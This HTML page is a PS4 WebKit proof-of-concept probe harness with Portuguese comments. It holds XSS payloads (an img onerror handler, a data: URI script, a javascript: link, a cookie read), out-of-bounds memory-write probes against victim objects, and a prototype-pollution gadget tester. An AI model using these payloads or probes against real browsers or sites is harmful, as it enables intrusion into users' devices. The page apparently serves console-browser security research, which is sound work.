<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Indirect Probes v6</title>
    <style>
        /* Estilos CSS (mantidos) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #user-agent-info { background: #333; color: #0f0; padding: 5px; margin-bottom: 10px; white-space: pre-wrap; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para erros pós-corrupção */
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-crash { color: #f0f; font-weight: bold; } /* Usado para indicar alta prob. de crash */
        .xss-box { border: 2px dotted red; padding: 5px; margin: 5px; color: yellow; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Indirect Probes v6</h1>
    <p>Foco: Efeitos Indiretos OOB Write, Testador Gadgets PP.</p>
    <div id="user-agent-info">Recuperando User Agent...</div>
    <div id="controls">
        </div>
    <div id="poc-output"></div>
    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM e PP Gadgets.</div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
        const PAUSE_DURATION = 300;
        const SHORT_PAUSE = 50;

        // --- Funções Auxiliares ---
        const isPotentialPointer = (high, low) => { /* Função isPotentialPointer simplificada */ return high > 0 || low >= 0x10000; };

        // --- Coleta de User Agent (igual v4) ---
        const displayUserAgent = () => { /* ... código igual ao v5 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};

        // --- Teste 1: XSS (Mantido - Sucesso Confirmado) ---
        const demonstrateXSS_Alert=()=>{log("XSS Alert...","warn");try{alert('XSS Alert!');}catch(e){log(`Alerta bloq: ${e.message}`,'good');}};const demonstrateXSS_DOM=()=>{log("XSS DOM...","warn");try{const t=document.getElementById('xss-target-div');if(t){t.innerHTML='<h2 class="log-vuln">XSS DOM!</h2><img src=x onerror=alert("XSS DOM ONERROR")>';log("DOM Manip OK.",'vuln');}else{log("Alvo DOM ñ enc.","error");}}catch(e){log(`Erro XSS DOM: ${e.message}`,'error');}};const demonstrateXSS_Cookie=()=>{log("XSS Cookie...","warn");try{const c=document.cookie;log(`Cookie: '${c}'`,c?'vuln':'info');}catch(e){log(`Erro Cookie: ${e.message}`,'warn');}};
        const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };


        // --- NOVO Teste 2: OOB Write Indirect Effects v6 ---
        const runOOBIndirectEffects_v6 = async () => {
            log("--- T2: OOB Write Indirect Effects v6 ---", 'test');
            log("Foco: Corromper sutilmente via OOB e observar efeitos ao USAR a vítima.", 'warn');
            log("ALTO RISCO DE CRASH!", 'crash');

            const bufferSize = 64;
            // Offsets OOB relativos ao FIM do buffer atacante
            const oobWriteOffsets = [-16, -8, -4, -1, 8, 16];
            // Valores simples para tentar corromper metadados
            const corruptionValues = [0, 1, 0xFF, 0xAAAAAAAA];
            // Tipos de vítima
            const victimFactories = {
                "ArrayBuffer": () => new ArrayBuffer(128),
                "Uint32Array": () => new Uint32Array(32), // Tamanho 128 bytes
                "Object": () => ({ id: 123, name: "victimObj", data: [1,2,3], valid: true }),
                "HTMLElement": () => {const d = document.createElement('span'); d.id='victimSpan'; d.textContent='victim'; return d;}
            };

            for (const victimName in victimFactories) {
                for (const writeOffset of oobWriteOffsets) {
                    for (const writeValue of corruptionValues) {
                        log(`Testando: Escrita OOB @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}`, 'subtest');
                        let victimObj = null;
                        let attackerBuffer = null;
                        let attackDataView = null;
                        let effectDetected = false;

                        try {
                            victimObj = victimFactories[victimName]();
                            attackerBuffer = new ArrayBuffer(bufferSize);
                            attackDataView = new DataView(attackerBuffer);
                            log(`  Atacante (Buffer ${bufferSize}B) e Vítima (${victimName}) alocados.`, 'info');

                            // Realizar escrita OOB (4 bytes)
                            const absoluteWriteAddr = attackerBuffer.byteLength + writeOffset;
                            try {
                                attackDataView.setUint32(absoluteWriteAddr, writeValue, true); // Escrever 32 bits
                                log(`  Escrita OOB @offset ${writeOffset} com ${writeValue.toString(16)} realizada.`, 'good');
                            } catch (e) {
                                log(`  Escrita OOB @offset ${writeOffset} falhou: ${e.message}`, 'warn');
                                continue; // Pular se escrita falhar
                            }
                            await new Promise(r => setTimeout(r, SHORT_PAUSE / 2)); // Micro pausa

                            // Tentar USAR o objeto vítima extensivamente
                            log(`  Tentando usar objeto Vítima (${victimName}) após OOB write...`, 'warn');
                            try {
                                log(`    Verificando tipo/estado inicial...`, 'info');
                                let initialCheck = `Type: ${typeof victimObj}`;
                                if (victimObj instanceof ArrayBuffer) initialCheck += `, byteLength: ${victimObj.byteLength}`;
                                else if (ArrayBuffer.isView(victimObj)) initialCheck += `, length: ${victimObj.length}, byteLength: ${victimObj.byteLength}`;
                                else if (victimObj instanceof HTMLElement) initialCheck += `, tagName: ${victimObj.tagName}, id: ${victimObj.id}`;
                                else if (typeof victimObj === 'object') initialCheck += `, keys: ${Object.keys(victimObj)}`;
                                log(`      ${initialCheck}`, 'info');

                                // Ações de uso variadas
                                log(`    Realizando ações de uso...`, 'info');
                                if (victimObj instanceof ArrayBuffer || ArrayBuffer.isView(victimObj)) {
                                    let v = ArrayBuffer.isView(victimObj) ? victimObj : new Uint8Array(victimObj);
                                    if (v.length > 0) v[0] = v[0]; // Read/Write start
                                    if (v.length > 10) v[v.length-1] = v[v.length-1]; // Read/Write end
                                    victimObj.slice(0, Math.min(1, v.byteLength)); // Tentar método slice
                                    if(ArrayBuffer.isView(victimObj)) victimObj.fill(0xEE, 0, Math.min(1, v.length)); // Tentar fill se for view
                                }
                                if (typeof victimObj === 'object' && victimObj !== null) {
                                    JSON.stringify(victimObj); // Tentar serializar
                                    Object.keys(victimObj); // Listar chaves
                                    victimObj.toString(); // Converter para string
                                    if(victimObj.hasOwnProperty('id')) victimObj.id = victimObj.id; // Acessar/escrever prop existente
                                    victimObj.newProp = 123; delete victimObj.newProp; // Add/delete prop
                                }
                                if (victimObj instanceof HTMLElement) {
                                    victimObj.textContent = victimObj.textContent; // Ler/escrever textContent
                                     document.getElementById('xss-target-div').appendChild(victimObj); // Adicionar/remover do DOM
                                     document.getElementById('xss-target-div').removeChild(victimObj);
                                }
                                // Passar para console (pode ter handlers especiais)
                                console.log("Logando vítima (pode diferir):", victimObj);

                                log(`    Uso da vítima concluído SEM ERROS IMEDIATOS.`, 'good');

                                // Verificar estado final
                                log(`    Verificando estado final...`, 'info');
                                let finalCheck = `Type: ${typeof victimObj}`;
                                if (victimObj instanceof ArrayBuffer) finalCheck += `, byteLength: ${victimObj.byteLength}`;
                                else if (ArrayBuffer.isView(victimObj)) finalCheck += `, length: ${victimObj.length}, byteLength: ${victimObj.byteLength}`;
                                else if (victimObj instanceof HTMLElement) finalCheck += `, tagName: ${victimObj.tagName}, id: ${victimObj.id}`;
                                else if (typeof victimObj === 'object') finalCheck += `, keys: ${Object.keys(victimObj)}`;
                                log(`      ${finalCheck}`, 'info');
                                if(initialCheck !== finalCheck) {
                                    log(`      >> ESTADO DA VÍTIMA MUDOU APÓS USO! <<`, 'leak');
                                    effectDetected = true;
                                }

                            } catch (e) {
                                log(`    ERRO AO USAR VÍTIMA após OOB Write (EFEITO INDIRETO?): ${e.message} ${e.stack ? e.stack.substring(0,100)+'...' : ''}`, 'leak');
                                effectDetected = true;
                            }
                        } catch (e) {
                            log(`  Erro GERAL durante teste: ${e.message}`, 'error');
                        } finally { victimObj = null; attackerBuffer = null; attackDataView = null; } // GC help

                        if (effectDetected) {
                           log(`  >>> POTENCIAL EFEITO INDIRETO DETECTADO (Escrita OOB @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}) <<<`, 'vuln');
                           // Não parar, continuar testando outros valores/offsets
                        }
                        await new Promise(r => setTimeout(r, SHORT_PAUSE)); // Pausa entre valores
                    } // Fim loop valores
                } // Fim loop escrita OOB
                 await new Promise(r => setTimeout(r, PAUSE_DURATION)); // Pausa maior entre vítimas
            } // Fim loop tipos de vítima
            log("--- T2 Concluído ---", 'test');
        };


        // --- NOVO Teste 3: Prototype Pollution Gadget Tester v6 ---
        const runPPGadgetTester_v6 = async () => {
            log("--- T3: Prototype Pollution Gadget Tester v6 ---", 'test');
            log("Foco: Testar herança e efeito de PP para propriedades definidas pelo usuário.", 'warn');
            log("EDITAR O SCRIPT para adicionar nomes de propriedades em 'propertiesToTest'", 'warn');

            // =======================================================================
            // <<< EDITE A LISTA ABAIXO com nomes de propriedades para testar >>>
            //      (Encontrados em pesquisas externas sobre gadgets PP)
            const propertiesToTest = [
                "constructor",      // Comum em exploits PP
                "__proto__",        // Poluição direta de protótipo (pode ser bloqueado)
                "toJSON",           // Usado por JSON.stringify
                "then",             // Usado por Promises
                "innerHTML",        // Gadget XSS comum (falhou antes, mas vale re-testar)
                "srcdoc",           // Gadget XSS comum (falhou antes)
                "className",        // Pode afetar estilo/seletores CSS
                "nodeType",         // Pode confundir checagens de tipo no DOM
                // Adicione mais propriedades aqui como strings: "nomeDaPropriedade",
            ];
            // =======================================================================

            const pollutedValueBase = "PP_V6_TEST_";
            const targetFactories = { // Objetos onde verificar herança
                "Object": () => ({}),
                "Array": () => [],
                "DIV": () => document.createElement('div'),
                "IFRAME": () => document.createElement('iframe'),
                "Function": () => function() {}
            };

            for (const propName of propertiesToTest) {
                log(`Testando PP Gadget: '${propName}'`, 'subtest');
                const pollutedValue = pollutedValueBase + propName;
                let inherited = false;
                let actionError = null;

                try {
                    // 1. Poluir
                    log(`  Poluindo Object.prototype['${propName}'] = "${pollutedValue}"`, 'info');
                    Object.prototype[propName] = pollutedValue;

                    // 2. Verificar Herança
                    log(`  Verificando herança em: ${Object.keys(targetFactories).join(', ')}`, 'info');
                    for (const targetName in targetFactories) {
                        try {
                             const targetObj = targetFactories[targetName]();
                             if (targetObj && targetObj[propName] === pollutedValue) {
                                 log(`    VULN: Objeto '${targetName}' herdou '${propName}'!`, 'vuln');
                                 inherited = true;
                             }
                        } catch(e) { log(`    WARN: Erro ao verificar herança em ${targetName}: ${e.message}`, 'warn'); }
                    }
                    if (!inherited) {
                         log(`  INFO: Nenhum objeto testado pareceu herdar '${propName}'.`, 'info');
                    }

                    // 3. Tentar Ação Genérica (Pode ou não ativar algo, pode crashar)
                    if (inherited) { // Só tentar se houve herança
                        log(`  Tentando ação genérica pós-poluição de '${propName}'...`, 'warn');
                        try {
                            // Tenta adicionar um DIV ou IFRAME ao DOM (pode ativar innerHTML/srcdoc)
                            if (propName === "innerHTML" || propName === "srcdoc" || propName === "className") {
                                const elem = document.createElement(propName === 'srcdoc' ? 'iframe' : 'div');
                                log(`    Adicionando <${elem.tagName}> poluído ao DOM...`, 'warn');
                                document.getElementById('xss-target-div').appendChild(elem);
                                // Verificar se XSS ocorreu? Difícil automaticamente. Usuário deve observar.
                                await new Promise(r=>setTimeout(r, SHORT_PAUSE)); // Pequena pausa
                                document.getElementById('xss-target-div').innerHTML = ''; // Limpar área
                            }
                            // Tenta usar JSON.stringify (pode ativar toJSON)
                            if (propName === "toJSON") {
                                log(`    Chamando JSON.stringify({})`, 'warn');
                                JSON.stringify({});
                            }
                             // Tenta usar Promises (pode ativar then)
                             if (propName === "then") {
                                 log(`    Tentando criar/resolver Promise`, 'warn');
                                 Promise.resolve({}); // Ver se interfere
                             }
                             // Tenta usar construtor (PERIGOSO!)
                             if (propName === "constructor") {
                                 log(`    Tentando 'new Object.prototype.constructor()'`, 'crash'); // Alto risco
                                 // new Object.prototype.constructor(); // Descomentar com MUITO CUIDADO
                             }
                             log(`    Ação genérica concluída sem erros imediatos.`, 'good');
                        } catch (e) {
                            log(`    ERRO durante ação genérica (EFEITO PP?): ${e.message}`, 'leak');
                            actionError = e;
                        }
                    }

                } catch (e) {
                    log(`  Erro GERAL durante teste do gadget '${propName}': ${e.message}`, 'error');
                } finally {
                    // 4. Limpar
                    try {
                        delete Object.prototype[propName];
                        log(`  Propriedade '${propName}' limpa.`, 'info');
                    } catch (e) { log(`  WARN: Falha ao limpar prop '${propName}': ${e.message}`, 'warn');}
                }

                 if (inherited || actionError) {
                     log(`  >> Teste para '${propName}' concluído com ${inherited ? 'HERANÇA CONFIRMADA' : ''}${actionError ? ' e ERRO NA AÇÃO' : ''}. Analisar logs. <<`, inherited ? 'vuln' : 'leak');
                 }
                 await new Promise(r=>setTimeout(r, SHORT_PAUSE));
            } // Fim loop propriedades

            log("--- T3 Concluído ---", 'test');
        };

        // --- Teste 4: OOB Write Confirm (Mantido - Sucesso Confirmado) ---
        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v5 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };

        // --- Teste 5: PP Basic Confirm (REMOVIDO - T3 cobre PP) ---
        // --- Teste 6: Crash Probes (REMOVIDO - T2 pode causar crash) ---

        // --- Função Principal ---
        const runAll = async () => {
             displayUserAgent();
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
            log("Iniciando todos os testes (INDIRECT PROBES v6)...");
            const tests = [
                runCSP_XSS,                     // T1: XSS Base (OK)
                runOOBIndirectEffects_v6,       // T2: OOB Indirect Effects (NOVO)
                runPPGadgetTester_v6,           // T3: PP Gadget Tester (NOVO)
                runOOBTestU8_Confirm,           // T4: OOB Confirm (OK) - Importante rodar APÓS T2
                // Testes 5 e 6 removidos para focar nos novos
            ];
             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v5 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
            if(outputDiv) log("\n\nTodos os testes INDIRECT PROBES v6 concluídos.", 'test');
            else console.error("Script concluído, div log NULO.");
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
        };

        // Adicionar controles manuais atualizados
        document.getElementById('controls').innerHTML = `
            <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
            <button onclick="runOOBIndirectEffects_v6()">Rodar T2 (OOB Indirect v6)</button>
            <button onclick="runPPGadgetTester_v6()">Rodar T3 (PP Gadget Test v6)</button>
            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
            <br>
            <span style="margin-left: 5px;">Teste JS Link (T1): </span>
            <a id="js-link-placeholder" href="#" style="color:orange">[Link JS URI]</a>
        `;

        displayUserAgent();
        // Opcional: Rodar tudo automaticamente
        // document.addEventListener('DOMContentLoaded', runAll);
    </script>

</body>
</html>
